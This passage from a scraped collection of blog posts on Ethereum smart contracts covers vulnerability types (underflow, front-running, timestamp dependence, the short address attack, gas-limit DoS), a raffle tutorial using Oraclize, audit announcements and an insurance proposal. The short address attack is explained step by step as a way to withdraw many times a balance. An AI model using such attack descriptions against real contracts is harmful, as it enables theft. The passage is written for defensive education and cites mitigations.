transferred.The DAO attack used a variation of this vulnerability.Under-/OverflowBalances are usually represented by unsigned integers, typically 256 bit numbers in Solidity. When unsigned integers overflow or underflow, their value changes dramatically. Let\u2019s look at the following example of a more common underflow (numbers shortened for readability):  0x0003- 0x0004--------  0xFFFFIt\u2019s easy to see the issue here. Subtracting 1 more than available balance causes an underflow. The resulting balance is now a large number.Also note, that in integer arithmetics division is troublesome, due to rounding errors.The solution is to always check for under- or overflows in the code. There are safe maths library to assist with this, such as SafeMath by OpenZeppelin.Transaction Ordering AssumptionsTransactions enter a pool of unconfirmed transactions and maybe included in blocks by miners in any order, depending on the miner\u2019s transaction selection criteria, which is probably some algorithm aimed at achieving maximum earnings from transaction fees, but could be anything. Hence, the order of transactions being included can be completely different to the order in which they are generated. Therefore, contract code cannot make any assumptions on transaction order.Apart from unexpected results in contract execution, there is a possible attack vector in this, as transactions are visible in the mempool and their execution can be predicted. This maybe an issue in trading, where delaying a transaction may be used for personal advantage by a rogue miner. In fact, simply being aware of certain transactions before they are executed can be used as advantage by anyone, not just miners.Timestamp DependenciesTimestamps are generated by the miners. Therefore, no contract should rely on the block timestamp for critical operations, such as using it as a seed for random number generation. Consensys give a 15-seconds rule in their guidelines, which states that it is safe to use block.timestamp, if your time depending code can deal with a 15 seconds time variation.Short Address\u00a0AttackThe Golem team has uncovered an interesting attack, which is described in detail here. The exploit affects ERC20 token transfers and similar contracts, and relies on the fact that transaction byte code can be of any size. Missing trailing bytes are filled with 0s by the Ethereum virtual machine (EVM).The attack consists in finding an address with a hex representation ending in various 0s, and leave out these trailing 0s in a withdrawal request. When the contract constructs a transfer request the shortened address is inserted and the rest of the transaction byte code is shifted.For example, leaving out two trailing 0s causes a 1-byte shift in the bytes following the address in the transaction data. The address is followed by the argument in the transaction data, which usually is an unsigned 256-bit integer with leading zeros. The leading 0s shift into the address field, making the address valid and ensuring the transaction destination is correct.A 1-byte shift in the argument field also conveniently causes the amount to be withdrawn to be multiplied by 256. As the EVM return 0s for missing trailing bytes, the transaction will succeed, transferring 256 times the requested amount.Thus, leaving out two hex 0s of the address can be exploited to withdraw 256000 tokens from an account that holds a balance of 1000 tokens, or similar. Leaving out four trailing 0s multiplies the amount by 2^16.To avoid this attack, your contracts should validate addresses.DoS AttacksContract transactions can sometimes be forced to always fails by making them exceed the maximum amount of gas that can be included in a block. The classic example of this is explained in this explanation of an auction contract. Forcing the contract to refund many small bids, which are not accepted, will bump up the gas used and, if this exceeds the block gas limit, the whole transaction will fail.The solution to this problem is avoiding situations in which many transaction calls can be caused by the same function invocation, especially if the the number of calls can be influenced externally.The recommended pattern to make pay outs, is to let clients request transfers, instead of pushing them out, as explained in the official Solidity documentation.Mitigation Measures and ConclusionIn this article we have looked at possible vulnerabilities and some examples on how these have been exploited in the past, in order to highlight the dangers of the \u201cCode is Law\u201d paradigm.Recent history has shown that executing turing complete smart contracts on public blockchains is dangerous and nowhere safe enough to substitute more traditional legal systems with their precise language, room for interpretation and arbitration.This does not mean we should abandon smart contracts. They are extremely useful tools and open up interesting applications. However, we should not consider them substitutes for legally binding contracts, but complementary tools for automation.Furthermore, we should take the following precautions to avoid vulnerabilities:Use open source and community accepted de facto standards for library contracts, such as Open Zeppelin\u2019s contracts.Use recommended patterns and best practise guidelines, such as those provided by Consensys.Consider contracting an audit of your smart contracts by a reputable provider.", "responses": "3"}, {"title": "TanzAI\u2122 TANZ\u014c\u2019s smart contract\u00a0AI", "author_name": "TANZ\u014c", "link": "https://medium.com/@TanzoOfficial/tanzaitm-tanzos-smart-contract-ai-63ec384717a0?source=search_post", "post_date": "Jun 1, 2018", "readtime": "2 min read", "upvotes": "762", "content": "TanzAI\u2122 TANZ\u014c\u2019s smart contract\u00a0AITANZ\u014cBlockedUnblockFollowFollowingJun 1, 2018We at TANZ\u014c truly appreciate all the positive feedback we have been getting about the disruption and innovation we are set to bring to the online handmade market very soon. Our back-end developers, however, would also like to point out that TANZ\u014c\u2019s innovation is not just skin-deep and that the TANZ\u014c platform itself will be a state-of-the-art marketplace that runs on cutting-edge tech. Our devs are currently hard at work on something they call TanzAI\u2122 and they are quite excited to share more about it:TanzAI\u2122is an Artificial Intelligence machine-learning system, which will have two main functions. First, the TanzAI\u2122Module will be verifying all data that gets registered on the blockchain and will optimize the decision-making process to execute purchases.The second function will be to identify counterfeit products before they get registered on the blockchain. This innovative function will work as an additional security layer, which will include reviews/rating analysis, bringing another level of trust by ensuring that products registered on the blockchain are authentic and uncompromised.Artificial Intelligence Machine Learning (AI/ML) will be applied for crunching all verified data in order to optimize buyer-crafter interactions by predicting their behavior. This process will be customized, based on the expectations and reputation of the crafter and the buyer. For instance, the AI engine will set automatic rules for crafters and buyers with excellent reputation by setting payment options 50% upfront and 50% on delivery; new buyers who just joined the platform will be required to pay upfront; repeat buyers with a certain crafter may enjoy payment upon delivery after scanning the product. The end results of all AI activities will be registered on the blockchain. TanzAI\u2122will be considered as an additional vote for the smart contract system. Whether for product registration or purchase execution, TanzAI\u2122will have to confirm to the smart contract system the validity of the data to be registered on the blockchain. Every blockchain transaction will be marked as \u201cAI verified\u201d.All critical platform data needs to be generated before the TanzAI\u2122API passes all implementation quality control stress tests and gets released to production.TanzAITM will use available knowledge related to counterfeit products and fake rating identifications to augment its capabilities. Crafter-buyer interactions are expected to be increasingly intensive as the platform grows, which will lead to constant optimizations based on observations of user behavior on the platform.In addition, the blockchain implementation through the smart contract system will ensure total transparency of the results of the various algorithm implementations.Well, after all that info from out devs, who can blame them for not being able to contain their excitement? They intend to have the AI module available by the end of the second year of production.https://tanzo.io", "responses": ""}, {"title": "Building a Raffle Smart Contract Using\u00a0Oraclize", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/building-a-raffle-contract-using-oraclize-e746e5edff6b?source=search_post", "post_date": "Oct 24, 2017", "readtime": "9 min read", "upvotes": "211", "content": "Building a Raffle Smart Contract Using\u00a0OraclizePablo RuizBlockedUnblockFollowFollowingOct 24, 2017Generating random numbers in Solidity is not simple. For starters, Solidity doesn\u2019t come with a native random function because the deterministic nature of the system.In mathematics and physics, a deterministic system is a system in which no randomness is involved in the development of future states of the system. A deterministic model will thus always produce the same output from a given starting condition or initial state.\u200a\u2014\u200ahttps://en.wikipedia.org/wiki/Deterministic_systemThere are a number of services and APIs that allow us to generate random numbers, but the problem is that they are not decentralized and you have to trust someone else that the generated number is truly random.Additionally, you can\u2019t trust seemingly random values available to the contract, such as blockhash, timestamp, or other miner-defined value. Miners can manipulate these values to such extent, and event choose not to publish a block. For a casino app you can\u2019t just trust miners, but there are a lot of other use cases where you could rely on blockhash for generating a random outcome, as long as the total amount of value resting on the quality of that randomness is lower than what a miner earns by mining a single block. More info on this: https://ethereum.stackexchange.com/questions/419/when-can-blockhash-be-safely-used-for-a-random-number-when-would-it-be-unsafeSo, how can we generate a random number securely inside a Solidity smart contract?There are a few solutions out there that can help us achieve this, such as Randao (Randao: https://github.com/randao/randao.) and Oraclize (http://www.oraclize.it/#services). In this article I\u2019m going to focus on Oraclize, mainly because it\u2019s extremely easy to get started with it and secondly, because it also can be used to do many more things other than generating a random number, such as accessing any other API from inside a Solidity smart contract.Building the Raffle\u00a0contractIn this tutorial we\u2019ll build a very simple raffle smart contract to show how to use Oraclize to generate a random number. The contract will work as follows:We\u2019ll deploy the contract and set a minimum and maximum number of participants the raffle will accept. Once there are enough participants, the raffle organizer (or anyone for that matter) can execute the function that will have Oraclize generate a random number. With that random number we\u2019ll just select the winner out of the participants\u2019 array.*For this first version we won\u2019t include all the payments logic, so anyone is free to participate but they won\u2019t receive any ETH prize, of course.Project SetupFor this tutorial, we\u2019ll just deploy everything on Remix, using Metamask to connect to Ropsten, as Oraclize won\u2019t work locally or on the JavaScript VM. I\u2019m going to assume you have some basic understanding on how to work with Remix and Metamask. Also, make sure you have at least 3 or 4 accounts with some ether balance as we\u2019ll need it to pay for the gas cost of joining the raffle as well as paying Oraclize to generate the random number (more on this later).Coding the\u00a0contractIn Remix, create a new file called Raffle.sol, this will be our contract containing all the logic for the raffle.pragma solidity ^0.4.4;contract Raffle {  uint private chosenNumber;  address private winnerParticipant;  uint8 maxParticipants;  uint8 minParticipants;  uint8 joinedParticipants;  address organizer;  bool raffleFinished = false;  address[] participants;  mapping (address => bool) participantsMapping;  event ChooseWinner(uint _chosenNumber,address winner);  event RandomNumberGenerated(uint);  function Raffle(){    address _org = msg.sender;     uint8 _min = 2;     uint8 _max = 10;     require(_min < _max && _min >=2 && _max <=50);    organizer = _org;    chosenNumber = 999;    maxParticipants = _max;    minParticipants = _min;  }function() payable {}function joinraffle(){    require(!raffleFinished);    require(msg.sender != organizer);    require(joinedParticipants + 1 < maxParticipants);    require(!participantsMapping[msg.sender]);    participants.push(msg.sender);    participantsMapping[msg.sender] = true;    joinedParticipants ++;  }function chooseWinner(uint _chosenNum) internal{    chosenNumber = _chosenNum;    winnerParticipant = participants[chosenNumber];    ChooseWinner(chosenNumber,participants[chosenNumber]);}function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    raffleFinished=true;        chooseWinner(0); //We'll replace this with a call to Oraclize service later on.}function getChosenNumber() constant returns (uint) {    return chosenNumber;  }function getWinnerAddress() constant returns (address) {    return winnerParticipant;  }function getParticipants() constant returns (address[]) {    return participants;  }}I\u2019ll go over the most important parts of the code:function Raffle(): The constructor of the contract sets the configuration state variables of the contract, such as the required minimum and maximum participants and who the organizer of the raffle is (for now, the creator of the contract). Notice we are hardcoding these variables, just to make the example simpler, but you could have the constructor receive these parameters. Also, we require there are at least 2 participants and no more than 50. This maximum could also be changed if you wanted.fallback function: I added the fallback function as we\u2019ll need to send Ether to the contract so it can pay for Oraclize\u2019s services. Did you think they would provide their services for free?\u00a0:)\u200a\u2014\u200aMore on this later.function joinRaffle(): This function allows the caller to join the raffle. First, we make a few checks to make sure we are not adding a new participant to a raffle that has already finished or that has reached its maximum amount of participants. We also check that the organizer is not the one trying to join and that this person hasn\u2019t already joined. Then we add the new participant to the participants array (so we can later select one of them at random) and we also add it to a participants mapping (which allows us to easy check if that participant had already joined). Having 2 variables that hold the same information feels a bit hacky to me, but given the example is rather simple, I felt we could get away with it.function generateRandomNumber(): This function will be called to have Oraclize generate the random number. Notice we made it public and doesn\u2019t require the organizer to be the one that calls it. This is on purpose, so that if the organizer, for some reason, disappears, the participants can select a winner anyways. This could be changed as well, for example, to allow this mechanism but only after some time has passed. For now, all this function does is set the raffleFinished flag to true (so this function can only be called once) and call the chooseWinner with a 0 as parameter. When we implement Oraclize, instead of sending a hardcoded 0 (which automatically makes the first person who joined the raffle the winner) we\u2019ll generate the random number.function chooseWinner(): This is an internal function that receives an uint which indicates the position of the winner in the participants array. With this number, we also set the address of the winner and fire an event that logs who the winner was so we can later retrieve it and display it.The remaining functions are just used later in the front-end to display the winners.Go ahead and try the contract in Remix. Just copy and paste the code above and deploy the contract. You should be able to join the raffle with different accounts and then, after there are enough participant, you can call generateRandomNumber() to select a winner (It will always be the address at position 0 in the participants array).Now that we have made sure the logic of the raffle is ok, it\u2019s time to use Oraclize to generate a random number for us.Using Oraclize to generate a random\u00a0numberIntegrating Oraclize in our smart contract is pretty easy and straight-forward. The fist step is to import the Oraclize API in our contract. Add the following line before the Raffle contract declaration.import \"github.com/oraclize/ethereum-api/oraclizeAPI.sol\";contract Raffle is usingOraclize{...}Notice that we also changed Raffle to inherit from usingOraclize.Now that we imported Oraclize, we have access to its functions. One thing you should be aware of is that importing Oraclize this way will fail, for example, if you are using Truffle to compile your contracts. If you are using Truffle, you will have to make a local copy of the Oraclize file and rename it to \u201cusingOraclize.sol\u201d as Truffle needs the file have the same name as the contract.The first thing we will do is add the Oraclize callback function. The way Oraclize works is by first making a query\u200a\u2014\u200awe could be querying an external API, Wolfram\u2019s Mathematica, or, like in our case, the built-in random number generator\u200a\u2014\u200awhich will fire a transaction to an Oraclize contract, and after that gets processed, it fires the callback function we define inside our contract with the corresponding result.This is how the callback function will look like:// the callback function is called by Oraclize when the result is ready// the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:// the proof validity is fully verified on-chainfunction __callback(bytes32 _queryId, string _result, bytes _proof){  // If we already generated a random number, we can't generate a new one.  require(!raffleFinished);  // if we reach this point successfully, it means that the attached authenticity proof has passed!  require (msg.sender == oraclize_cbAddress());  if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {    // the proof verification has failed, do we need to take any action here? (depends on the use case)  } else {    // the proof verification has passed    raffleFinished=true;    // for simplicity of use, let's also convert the random bytes to uint if we need    uint maxRange = joinedParticipants; // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return    uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range        chooseWinner(randomNumber);    RandomNumberGenerated(randomNumber); // this is the resulting random number (uint)  }}First, we will make sure that raffleFinished is false so we don\u2019t allow this function to be called more than once.Then we are checking that the data we got has not been tampered with while being delivered to the smart contract. You can read more about that here: https://blog.oraclize.it/the-random-datasource-chapter-2-779946e54f49If the verification has passed, meaning the data has not been tampered with, then we proceed to use the random number. We will be calling the chooseWinner() function that we previously used, but instead of passing a hardcoded 0 as parameter, we\u2019ll pass the random number we generated.As you can see, the random number that gets generated uses the joinedPaticipants state variable to determine its max range. We are also firing an event to log the random number we generated.The last thing we have to do is modify our generateRandomNum() function so when someone executes it, it makes the query to Oraclize.function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof    uint N = 4; // number of random bytes we want the datasource to return    uint delay = 0; // number of seconds to wait before the execution takes place    uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function    bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId}By calling oraclize_newRandomDSQuery(delay, N, callbackGas) we\u2019ll have Oraclize generate a random number for us, and when it\u2019s ready, the callback function we defined earlier will be fired. oraclize_newRandomDSQuery receives 3 parameters.delay: which is the number of seconds to wait before the execution takes place. We set it to 0 so it executes the callback as soon as we have results.N: which is how many bytes we want the datasource to return. In our case, since we made the raffle to accept up to 50 participants if the organizer wants so, 4 bytes is more than enough.callbackGas: How much gas we will forward Oraclize so it can execute the callback function. We are setting it up to 200.000 which is enough to execute this function. (In my tests, it has consumed around 125.000 gas).And that\u2019s it! You can give it a try in Remix and see how it works. A few considerations and words of advice:Oraclize\u2019s pricing model: As I mentioned before, Oraclize isn\u2019t free. You can check their pricing here: http://docs.oraclize.it/#pricing. Notice that the first query your contract makes is free, then you will have to pay for the transaction. How? The contract executing the query pays for it from it\u2019s balance. So, before you call the generateRandomNum() function, make sure you send some ether to the contract.\u200a\u2014\u200aThat\u2019s why we included the fallback function.Testing in Remix: Testing your contract can be quite tedious. First, since we are using Oraclize, you can\u2019t test this locally, we need to connect to a testnet (I\u2019m using Ropsten). You should remember that when you call generateRandomNum() it will take 30\u201350 seconds to get mined and then, it will take another minute to actually process the callback function. Also, switching accounts in Metamask + Remix takes some work. Arm yourself with patience.How much gas is needed to execute this? I\u2019m still playing around with the necessary gas required to execute this contract. On Remix, I had to up the limit to 5.000.000 when deploying the contract. Make sure you are also sending enough gas when generating the random number, or else the callback function will fail.The contract we built today allows us to run a simple Raffle that people can join and then a winner is selected by using Oraclize to generate a random number we can be certain hasn\u2019t been tampered with. There\u2019s a lot of room for improvements and new features, such as allowing people to enter the Raffle with ether and win a prize.Let me know in the comments section below if you have any suggestions or if you encounter any problems with the code.", "responses": "5"}, {"title": "Insuring Against Smart Contract\u00a0Failure", "author_name": "Luke Duncan", "link": "https://medium.com/@lkngtn/insuring-against-smart-contract-failure-86d0d9206d90?source=search_post", "post_date": "Apr 25, 2018", "readtime": "8 min read", "upvotes": "333", "content": "Insuring Against Smart Contract\u00a0FailureLuke DuncanBlockedUnblockFollowFollowingApr 25, 2018The intention of this post is to explore a possible way to make the Ethereum ecosystem more friendly without requiring any contentious changes to the base-layer protocol or community philosophy.Personally, I\u2019m against institutionalizing processes for irregular state changes to Ethereum, as I believe such a process undermines the core value proposition of a base-layer blockchain protocol.However, it is clear that there is an issue that needs to be addressed to ensure that Ethereum lives up to its potential as a platform that is friendly to both developers who are creating valuable applications and to the users of those applications.Who is responsible for smart contract security?Do we blame Parity for being negligent and not following best practices, or do we blame the users of the parity multi-sig wallet for choosing to trust unaudited code, or do we say its nobody fault and collectively clean up the mess, again, and again?Who is to blame when funds are\u00a0lost?The operation of smart contracts on Ethereum is a unique risk. Developers deploy open source code but have no liability when it fails. Users are putting their funds at stake but are not sophisticated enough to assess the risk involved. So who do we hold accountable when things break?Some of the most significant losses of funds, including the Parity multi-sig issue, have boiled down to trivial mistakes that would have certainly been caught by a professional auditing team. But developers are building public infrastructure for free. Requiring development teams to pay for expensive audits and bug bounties on principle may not be feasible and is likely to deter positive contributions in the future.Looking at the issue strictly from a user\u2019s perspective, whenever a user makes a transaction on the blockchain they are already required to make an assessment of the risk of that action (being your own bank is kind of hard, huh?).Most users are not equipped to examine the contracts they are using themselves, nor would it be scalable for every user to personally examine every contract even if they had the required skills. So users rely on the reputation and trust of development teams as a heuristic, but what if instead they could pay an insurance provider to take on the risk on their behalf?The Standard Model of Insurance MarketsGenerally an insurance market consists of a single entity (the insurer) which provides insurance agreements (policies) for many entities (policy holders). For each insurance policy the insurer sets a premium which is paid on a periodic basis, or the agreement becomes void. The policy specifies a maximum liability amount as well as the conditions for payout. The insurer\u2019s business model is predicated on its ability to assess the risk of individual policies and maintain a pool of funds to cover expected payouts. From the policy holders perspective, they are paying a consistent fee in order to hedge against a significant risk of loss.Insurability of Smart Contract\u00a0BugsA key consideration for the feasibility of this proposal is whether smart contract bugs can be considered an insurable risk.Large number of similar exposure units: There are many instances where users are exposed to the risk of bugs, and their risks depend on the specific contracts they are engaging with. These risks can be classified into various groups and types of exposure by an insurance provider.Definite Loss: The expected behavior of a contract can be summarized in human readable language, and if the actual result on chain differs from the expected result expressed in the policy then the loss can be shown to have occured at a specific time and from a specific cause.Accidental Loss: From the perspective of an insurance provider the exploitation of a bug is similar to theft, which is commonly insured. The event is not necessarily random or accidental, but it can be proven to have occured due to no fault of the insured party.Large Loss: It only makes sense to insure for losses which would be large enough that the individual entity should not simply self-insure by saving, this is probably not relevant for contracts which will only ever handle small amounts, but there are definitely cases where contracts may handle significant value.Affordable Premium: If the event is too likely to occur, or the cost of the event so large, that the resulting premium is unaffordable then no one will buy insurance, in this particular case the risk of a carefully developed contract should be 0, so carefully constructed contracts that follow industry best practices should be relatively cheap to insure even for very large amounts.Calculable Loss: Based on a loss event, there should be significant evidence to calculate the damages/loss on the impacted party. In the event of a smart contract bug, it should be pretty easy to quantify losses based on public blockchain records.Limited risk of catastrophically large losses: An initial distinction between application layer bugs and protocol layer bugs is necessary, as insurance is probably not a good mechanism to mitigate risk for protocol layer / consensus failure, but such failures would likely result in a non-contentious hardfork anyways. Application-layer bugs are less likely to affect all users simultaneously and insurers can help mitigate these risks further by selectively insuring contracts and pushing for developers to implement safety features like trustless global freeze functions.With minor caveats, it feels like smart contract bugs at the application layer are definitely an insurable risk. So what would a insurance provider and policy actually look like?Auditors as Insurance ProvidersSuccessful Insurance providers will be experts at assessing the risks of smart contract failures, and can monetize an information asymmetry advantage with regard to the security of contracts.Unlike other types of risks, a code vulnerability is a binary outcome and once it is uncovered the probability of it being exploited\u2026 goes from 0 to 100, real quick. The risk assesment being made by the insurance provider is not about the risk of various known bugs being exploited it is about the existence of an unknown vulnerability. A good auditing company should, for a given contract, be able reach a point where they are confident that there is almost no risk. However, like many problems there is a significant difference in the level of effort to be 95% confident versus 99% or 99.99% confident in their analysis.Based on their private analysis and degree of confidence they can set a premium for each contract which they believe will be profitable, and direct ongoing efforts towards the contracts that will either attract new customers or represent a excessive risk exposure to the insurance pool.The result is that auditing companies that provide insurance will have a competitive interest in proactively reviewing significant and broadly useful contracts in order to attract customers rather than being contracted strictly as consultants by development teams.A significant caveat for insurers, and a possible reason why such a system might fail is that there is inherent information leakage that is both undesirable yet unavoidable from the perspective of the insurance provider, who is attemptoing to capitalize on information assymetry to make a profit.If users see that insurance is offered for a contract then they implicitly know that it has been reviewed and that the auditors are reasonably sure that it is safe to use, this means that users can significantly reduce risk simply by interacting only with contracts that insurance is offered for, despite never paying premiums. From the users perspective this is simply a positive externality.It\u2019s also possible that this information leakage could be exploited by competing insurance providers that choose to spend the bulk of their operating budget on marketing, and simply copy the contracts and premiums offered by more legitimate firms\u200a\u2014\u200athough such a strategy might prompt legitimate firms to lure their competitors into excessively risky positions so it\u2019s hard to say what the equilibrium would end up looking like.A need for smarter contractsThe proposal above could be implemented right now without any changes to the underlying protocol, but actually managing the policies would be fairly cumbersome.For these insurance agreements to work it is critical we can tie the insured party to the loss directly because we do not want someone to be able to insure the loss of someone else\u2019s funds. The most practical way to do this is for the policy to apply to specific Ethereum addresses and contracts, this way insurers do not need to worry about the messiness of trying to sort out issues where someone may have had their private key lost or stolen, they just need to look at public blockchain data to assess damages and send payouts.We also want the contents of the the insurance policy to be human readable and contain language that cannot be interpreted by the EVM. Right now this would requires a traditional legal agreement, but such an agreement is meaningless unless it is associated with a real world identity in addition to the private key. Projects like OpenLaw and Mattereum are working on making it simple to connect traditional legal agreements into smart contracts.But wait, what if we want to preserve the pseudo-anonymous property of Ethereum, or we want to use an address which doesn\u2019t represent a legal entity but is instead a DAO? Then ideally this would be implemented using a collateralized human readable agreements that is enforceably arbitrated on-chain without needing a traditional legal entity or intruding on the user\u2019s privacy.Much of the research I\u2019m doing for the Aragon Network applies here, as does the work of projects like Kleros and Delphi which are actively working on improving how to handle arbitration of subjective issues involving smart contracts.Conclusion and comparison to other proposalsThis proposal does not do anything for people who have had issues in the past, It is intended to be a self-sufficient standalone model for insurance that does not depend on the expectation of any future state changes or fund recovery proposals succeeding. Unlike other proposals it does not offer concrete or immediate remedies because it is not a simple code fix, I\u2019m simply pointing it out a possible a path forward that might prove to be less contentious.A key distinction between this aproach and proposals like EIP-999 is that with an insurance model users are still required to take 100 percent responsibility for their actions within the protocol. Insurance makes it easier and more practical to use the platform safely, but user\u2019s choices still have the same consequences. If they opt to not pay for insurance they are choosing to take on a greater risk, and it should be clear that they will bear the consequences of that choice.It also differs from Alex Van de Sande\u2019s insurance proposal where the insurer issues tokens that essentially create a futures market based on a contract vulnerability being found and exploited within some time horizon. His approach in some ways is simpler, but may produce some strange side effects because it does not enforce the requirement of a definite and calculable loss. Specifically the beneficiary in the event of a payout is not necessary the individual who experiences the loss. This can lead to a situation where a previously unknown vulnerability is found, and the attacker can profit by buying up futures with the intention of exploiting the vulnerability themselves. That issue isn\u2019t necessary too problematic, but in my opinion a more traditional insurance policy is a better.My hope is that if we continue to look for constructive solutions we can come to solution that is not contentious and which strengthens the community and technology moving forward. We should not not rush into or force a contentious decision until we feel we have exhausted all alternative paths.", "responses": "2"}, {"title": "Updated token smart contract address and our new quality assurance process", "author_name": "Brickblock.io", "link": "https://blog.brickblock.io/updated-token-smart-contract-address-and-our-new-quality-assurance-process-2d3b3778c20?source=search_post", "post_date": "Dec 8, 2017", "readtime": "2 min read", "upvotes": "159", "content": "Updated token smart contract address and our new quality assurance processBrickblock.ioBlockedUnblockFollowFollowingDec 8, 2017Throughout this week we have focused our efforts on distributing Brickblock Tokens (BBK) to everyone who contributed to our project during the token pre-sale and first ICO period.This includes verifying as many addresses as possible (even those from exchanges), working accordingly with Cubits to manage fiat contributions, and finalizing our smart contract audit.As we were distributing tokens, we noticed a human error was made in our smart contract: setting a quantity of 50 million tokens instead of 500 million. This means the intended amount of Brickblock Tokens could not be in circulation.In order to resolve this situation, we have created a new contract to re-distribute the tokens with a new address. No effort from our contributors will be needed and you will not be affected\u200a\u2014\u200awe are issuing this notice for transparency and documentation only.We analyzed the situation and how this error could have happened despite taking utmost care in distribution. We concluded that while focusing intensely on code security, we have not reviewed the underlying specifications well enough.To make sure that future projects specifications are met and reviewed intensely, we have asked Daniel Breyer, a new member of the Brickblock team with four years of experience as project manager in the fintech industry, to implement a system of quality assurance moving forward. This will help us to ensure for future main net deploys not only a high security aspects but also a higher quality standard.The most important thing to remember is that the value of the BBK token is not affected. The token will not be removed or leave your wallet. This is simply a new smart contract for the BBK token. We welcome all to view our smart contract audit to have a better understanding of how we have created the base of our token technology.Please keep in mind that Brickblock Tokens will not be tradable on exchanges until our final ICO period in Q2 2018 has concluded.", "responses": ""}, {"title": "Ontology Team Statement on NEP-5 Smart Contract Storage Injection Vulnerability", "author_name": "The Ontology Team", "link": "https://medium.com/ontologynetwork/ontology-team-statement-on-nep-5-smart-contract-storage-injection-vulnerability-60d470bfd85a?source=search_post", "post_date": "May 19, 2018", "readtime": "", "upvotes": "450", "content": "Ontology Team Statement on NEP-5 Smart Contract Storage Injection VulnerabilityThe Ontology TeamBlockedUnblockFollowFollowingMay 19, 2018The security audit company, Red4Sec, has recently discovered a storage injection vulnerability in the code of some NEP-5 smart contracts. By exploiting this vulnerability, an attacker could make changes to the contract storage. An attacker can burn a certain amount of tokens and change the status of totalSupply within the contract. However, such an attack can only change the show value of totalSupply. It will not change the actual supply volume. In addition, the cost of this attack would be very high. Therefore, we consider the risk of damage from this attack very limited.The Ontology Team has investigated and analyzed the vulnerability, and reached the following conclusions:1. ONT holder accounts are safe and are not affected by the attack.2. The Ontology Team will continue to follow the progress of the vulnerability and maintain close communication and technical cooperation with related organizations to ensure the security of ONT holders' accounts.The Ontology Team", "responses": ""}, {"title": "Smart Contract A Blockchain Innovation for Non-Techies\u00a0:", "author_name": "Pramod Chandrayan", "link": "https://codeburst.io/smart-contract-a-blockchain-innovation-for-non-techies-d3e65233cf4e?source=search_post", "post_date": "Sep 2, 2017", "readtime": "2 min read", "upvotes": "398", "content": "Smart Contract A Blockchain Innovation for Non-Techies\u00a0:Pramod ChandrayanBlockedUnblockFollowFollowingSep 2, 2017Image Source\u00a0: contractworks.comIn todays digital economy most of the transactions between any two parties(stakeholders)happens as a centralised model where both the parties involved has to place their trust on the central system and has to agree as per their protocols to transact. Here the catch is that since their a role of a third party in the transaction, both parties trust can be compromised. But with the evolution of Blockchain technology this concerned has been mitigated to a large extend.As i covered the fundamentals of smart contract in my last article Blockchain fundamentals today i would try to further explain it in a language which is easy for everyone to understand\u00a0.What is Smart Contract\u00a0?It\u2019s a piece of software that has it\u2019s own protocols for negotiating the contract terms\u00a0, verifies the contract automatically and executes the agreed terms between two parties involved.Blockchain collaborates with smart contract to removes the need for third party centralised system to executes the contract between two parties, thus making the decentralised system more reliable and secure. Here untrusted parties can directly transact with each other by executing a smart contract based on their negotiated terms.Smart Contract Simplified Explanation using Infographic:The beautiful representation of smart contract is given by shermin voshmigr & valentine kalinovInfographics source\u00a0: www.blockchainhub.net/As you can see in above infographics that smart contract completely eliminates the need for trusted third parties and thus makes it easy for stakeholders to directly executes their transaction and removes any chances of fraud.Anatomy of Smart Contract\u00a0:Smart contract is structured in 5 simple stepsIdentity AgreementSetting up rules for transactions3. Coding the desired rules and business logics4. Encrypting the code blocks using blockchain technology5. Code execution and processing6. Updating the transaction record details after code execution across all the nodes involved in transactions. Once updated the details can\u2019t be altered.How Does Smart Contract Works(Technically )\u00a0:Will decode the technical operation of smart contract executions using blockchain in this series of Blockchain TechnologyKeep inspiring by clapping if you are loving my series of articles on Machine Learning & BlockchainTo be continued\u2026..Thanks for being with me\u00a0..", "responses": "1"}, {"title": "Cardstack Smart Contract Passes Two Security Audits, Reaches Milestone", "author_name": "Cardstack Team", "link": "https://medium.com/cardstack/cardstack-smart-contract-passes-security-audit-57e18ed90a76?source=search_post", "post_date": "Apr 27, 2018", "readtime": "2 min read", "upvotes": "663", "content": "Cardstack Smart Contract Passes Two Security Audits, Reaches MilestoneWe are officially open-sourcing our smart contract\u00a0code.Cardstack TeamBlockedUnblockFollowFollowingApr 27, 2018The Cardstack Token Smart Contract is the mechanism by which people may contribute to Cardstack\u2019s crowd fundraiser and receive Cardstack Tokens (CARD). This smart contract has been in development since last August (see GitHub history). It\u2019s what makes our Token Generation Event possible, and is the main entry point into the Cardstack community.Security and transparency are two of Cardstack\u2019s core values. With that said, we\u2019re very pleased to announce that the Cardstack Token Smart Contract has now passed two security audits by a world renowned security research firm. The first security audit was completed late 2017, and the second was completed in March 2018. Each audit found no major security issues\u200a\u2014\u200athe only findings were minor, with no material impact on the security of our token. We have already incorporated the research firm\u2019s findings into our smart contract code.At this point, we\u2019re proud to officially open-source our audited smart contract code. This includes two of the functionalities we\u2019ve described in previous blog posts\u200a\u2014\u200aupgradable contracts and token vesting. This smart contract is an important first step in the ultimate road toward the fully realized vision of the Cardstack token ecosystem, as well as the Tally protocol.In the near future we\u2019re developing an approach to implement non-fungible token mechanisms, which will power our Software and Services Coupon (SSC), a non-tradable intermediary token pegged to USD that meters users\u2019 software usage and denominates the reward for makers. We also plan to implement a staked voting mechanism, which will allow Cardstack users to stake CARD tokens to participate in voting. Our current smart contract is an important stepping stone toward the implementation of these features.Finally, we\u2019ll be starting a bug bounty program. We encourage you to report any issues you discover in our smart contract\u2014Ether rewards will be available depending on the magnitude of the issue. More details will be announced shortly, but in the meantime please report issues to security@cardstack.com.We\u2019re very excited about our progress, and look forward to sharing more with you as we hit the next milestones. Thank you, as always, for your support.", "responses": "2"}, {"title": "Interview with ICO Smart Contract Auditor\u200a\u2014\u200aBok\u00a0Khoo", "author_name": "Dr. Michael J. Garbade", "link": "https://medium.com/ledu-tokens/interview-with-ico-smart-contract-auditor-bok-khoo-1ce5ccb58aef?source=search_post", "post_date": "Dec 31, 